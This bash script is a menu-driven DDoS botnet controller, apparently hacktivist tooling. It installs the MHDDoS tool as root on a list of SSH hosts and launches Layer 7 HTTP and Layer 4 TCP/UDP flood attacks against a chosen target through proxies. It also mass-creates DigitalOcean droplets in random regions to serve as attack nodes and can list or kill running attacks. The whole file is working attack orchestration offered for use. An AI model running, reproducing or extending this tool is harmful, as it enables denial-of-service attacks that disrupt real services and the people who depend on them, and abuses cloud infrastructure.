#!/bin/bash

CURRENT_DIR=$(dirname "$0")
touch -a "$CURRENT_DIR/hosts.txt"
export DIALOGRC="$CURRENT_DIR/.dialogrc"

while : ; do
    MENU_OPTION=$(dialog --title 'Botnet' --menu --stdout "Before the start populate your hosts.txt file!" 15 55 8  1 'Botnet attack on host' 2 'Bandwidth monitoring' 3 'Show current attacks' 4 'Stop all botnet attacks' 5 'Stop certain host/ip attack in botnet' 6 'Setup SSH hosts' 7 'Cloud providers' 8 'Exit')

    case $MENU_OPTION in

    1)
        MENU_OPTION=$(dialog --title 'Attack type' --menu --stdout "Choose option:" 15 55 2 1 'L7 Attack - HTTP protocol' 2 'L4 Attack - TCP/UPD protocol' 3 'Back')

        case $MENU_OPTION in

        1)
            ATTACK_TYPE=$(bash "${CURRENT_DIR}/menus/l7.sh")
            TARGET=$(bash "${CURRENT_DIR}/menus/url.sh")
            SOCKS_TYPE=$(bash "${CURRENT_DIR}/menus/socks_type.sh")
            THREADS=$(bash "${CURRENT_DIR}/menus/threads.sh")
            PROXY_FILE=$(bash "${CURRENT_DIR}/menus/proxy_file.sh")
            RPS=$(bash "${CURRENT_DIR}/menus/rps.sh")
            DURATION=$(bash "${CURRENT_DIR}/menus/duration.sh")

            clear
            printf "Starting L7 attack...\n"
            bash "$CURRENT_DIR/runoverssh" root "screen -d -m python3 /root/MHDDoS/start.py $ATTACK_TYPE $TARGET $SOCKS_TYPE $THREADS $PROXY_FILE $RPS $DURATION" --hostsfile "$CURRENT_DIR/hosts.txt"

            break
            ;;

        2)
            ATTACK_TYPE=$(bash "${CURRENT_DIR}/menus/l4.sh")
            TARGET=$(bash "${CURRENT_DIR}/menus/url.sh")
            THREADS=$(bash "${CURRENT_DIR}/menus/threads.sh")
            DURATION=$(bash "${CURRENT_DIR}/menus/duration.sh")
            SOCKS_TYPE=$(bash "${CURRENT_DIR}/menus/socks_type.sh")
            PROXY_FILE=$(bash "${CURRENT_DIR}/menus/proxy_file.sh")

            clear
            printf "Starting L4 attack...\n"
            bash "$CURRENT_DIR/runoverssh" root "screen -d -m python3 /root/MHDDoS/start.py $ATTACK_TYPE $TARGET $THREADS $DURATION $SOCKS_TYPE $PROXY_FILE" --hostsfile "$CURRENT_DIR/hosts.txt"

            break
            ;;


        3)
            continue
            ;;

        esac
        ;;
        
    2)
        count=0
        while read -r host
        do
          options+=($((++count)) "$host")
        done < "$CURRENT_DIR/hosts.txt"

        MENU_OPTION=$(dialog --title 'Bandwidth monitoring' --menu --stdout "Choose host to monitor:" 15 55 ${#options[@]} "${options[@]}")
        HOST=${options[$MENU_OPTION*2-1]}

        ssh -t "root@$HOST" 'python3 MHDDoS/start.py TOOLS'
        break
        ;;

    3)
        echo "Loading..."
        while read -r host
        do
            processes=$(ssh -n "root@$host" "ps -aux | grep start.py | grep -v grep | grep -vi screen" | awk '{print $13, $14}' | sed 's/^/    /')
            output+="$host\n$processes\n\n"
        done < "$CURRENT_DIR/hosts.txt"
        printf "$output" > "$CURRENT_DIR/output.txt"
        dialog --title "Hosts and their active attacks" --textbox "$CURRENT_DIR/output.txt" 30 50

        break
        ;;

    4)
        bash "$CURRENT_DIR/runoverssh" root "killall screen" --hostsfile "$CURRENT_DIR/hosts.txt"
        break
        ;;


    5)
        TARGET=$(bash "${CURRENT_DIR}/url.sh")
        bash "$CURRENT_DIR/runoverssh" root "pkill -f '$TARGET'" --hostsfile "$CURRENT_DIR/hosts.txt"

        break
        ;;

    6)
        if dialog --title "Setup SSH hosts" --stdout --yesno "Following command will install MHDDoS tool to your SSH hosts\n                    Do you want to proceed?" 7 65; then
          CURRENT_DIR=$(dirname "$0")
          bash "$CURRENT_DIR/runoverssh" --script "$CURRENT_DIR/attacker-setup.sh" --hostsfile "$CURRENT_DIR/hosts.txt" root
        fi
        break
        ;;

    7)
        MENU_OPTION=$(dialog --title 'Cloud providers' --menu --stdout "Choose option:" 15 55 2 1 'Digital Ocean' 2 'Back')
        case $MENU_OPTION in

            1)
                MENU_OPTION=$(dialog --title 'Digital Ocean *doctl required for this menu*' --menu --stdout "Choose option:" 15 55 2 1 'Create droplets' 2 'Delete all droplets' 3 'Copy droplets ips to hosts.txt' 4 'Back')
                case $MENU_OPTION in

                    1)
                        DROPLETS_NUM=$(bash "${CURRENT_DIR}/menus/droplets_num.sh")
                        KEYS=$(doctl compute ssh-key list --format=ID --no-header | tr '\n' ',')

                        for ((c=1; c<=DROPLETS_NUM; c++))
                        do
                             # get a random region from the list of all available
                             REGION=$(doctl compute region list --no-header | grep true | awk '{print $1}' | sort -R | head -n1)
                             # generate random hash for droplet name
                             if [[ $OSTYPE == "linux-gnu"* ]]; then
                               HASH=$(date | md5sum | awk '{print $1}')
                             else
                               HASH=$(date | md5)
                             fi

                             doctl compute droplet create \
                               --image ubuntu-20-04-x64 \
                               --size s-1vcpu-1gb \
                               --user-data-file attacker-setup.sh \
                               --region "$REGION" \
                               --ssh-keys "${KEYS}" \
                               --enable-monitoring \
                               "fck-invaders-${REGION}-${HASH}"
                        done
                        dialog --title "Ok" --msgbox "Droplets was successfully created!" 6 50
                        ;;

                    2)
                        DROPLETS_NUM=$(bash "${CURRENT_DIR}/menus/droplets_num.sh")
                        # Load list of droplets ID
                        DROPLETS=$(doctl compute droplet list --format ID,Name --no-header | awk '{print $1}')
                        clear
                        echo "$DROPLETS"
                        # Deleting all found
                        doctl compute droplet delete $DROPLETS -f
                        dialog --title "Ok" --msgbox "Droplets was successfully deleted!" 6 50

                        ;;

                    3)
                        doctl compute droplet list --format=PublicIPv4 --no-header >> "$CURRENT_DIR/hosts.txt"
                        dialog --title "Ok" --msgbox "Ip addresses was successfully appended to hosts.txt" 6 50
                        ;;

                    4)
                        continue
                        ;;
                esac
                continue
                ;;

            2)
                continue
                ;;

        esac

        break
        ;;

    8)
        break
        ;;

    esac
done

printf "\nInvaders must die! Slava Ukraini!\n"

